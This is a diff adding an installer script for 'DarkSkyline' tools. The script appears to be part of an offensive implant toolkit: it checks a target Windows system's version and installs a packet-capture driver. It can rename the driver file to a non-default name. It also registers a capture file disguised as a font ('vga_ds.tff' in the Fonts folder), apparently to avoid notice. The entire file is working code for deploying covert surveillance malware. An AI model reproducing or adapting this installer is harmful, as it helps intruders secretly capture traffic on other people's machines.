@@ -1,0 +1,87 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of DarkSkyline tools
+#
+# Modifications:
+#  11/18/2002	Created.
+#  02/03/2004	Updated to use module calls
+#  05/03/2004	Updated to handle non-default capture file
+#  12/15/2008	Updated to handle non-default driver names
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "_GetSystemVersion.epm";
+
+@echo off;
+
+if (($argc < 2) || ($argc > 3)) {
+    echo "Usage: $argv[0] <driverName> [captureFile]";
+    return false;
+}
+
+string $driver = $argv[1];
+string $captureFile = "\\SystemRoot\\Fonts\\vga_ds.tff";
+if ($argc >= 3) {
+    $captureFile = $argv[2];
+}
+
+# check to make sure we're NT 4 Sp4 or higher
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (_GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows NT Sp4 or greater";
+    pause;
+} else if (($majorVersion == 4) && ($spMajorVersion < 4)) {
+    # NT 4 Service pack 3 or less
+    echo "*** Target system is pre-NT Sp4. ***";
+    echo "    DarkSkyline is not compatible with this system";
+    return false;
+}
+
+if($driver != "tdip"){
+	#they have changed the default driver name. need to copy it on local disk
+	@record on;
+	#get resource directory
+	ifnot (`getdirectory -resources`) {
+		echo "* Unable to get resources directory";
+		return false;
+	}
+
+	string $resDir = GetCmdData("dir");
+	ifnot (defined($resDir[0])) {
+		echo "* Unable to retrieve resources directory - can't copy local tdip.sys to $driver.sys";
+		return false;
+	}	
+	`local copy $resDir\\DarkSkyline\\tdip.sys $resDir\\DarkSkyline\\$driver.sys`;
+	@record off;
+}
+
+
+ifnot (_DriverInstall($driver, "DarkSkyline", 2, 1)) {
+    return false;
+}
+
+# add the extra registry keys
+bool $keysAdded = true;
+
+echo "Adding extra registry key";
+ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value ImageFile -type REG_EXPAND_SZ -data "$captureFile"`) {
+    echo "    FAILED";
+    return false;
+}
+
+# set maximum file size
+if (`script SetMaxFileSize.eps $driver`) {
+    echo "SET OF MAXIMUM CAPTURE FILE SIZE SUCCESSFUL";
+} else {
+    echo "**** UNABLE TO SET NEW MAXIMUM CAPTURE FILE SIZE ****";
+    return false;
+}
+
+# we're done...
+return true;
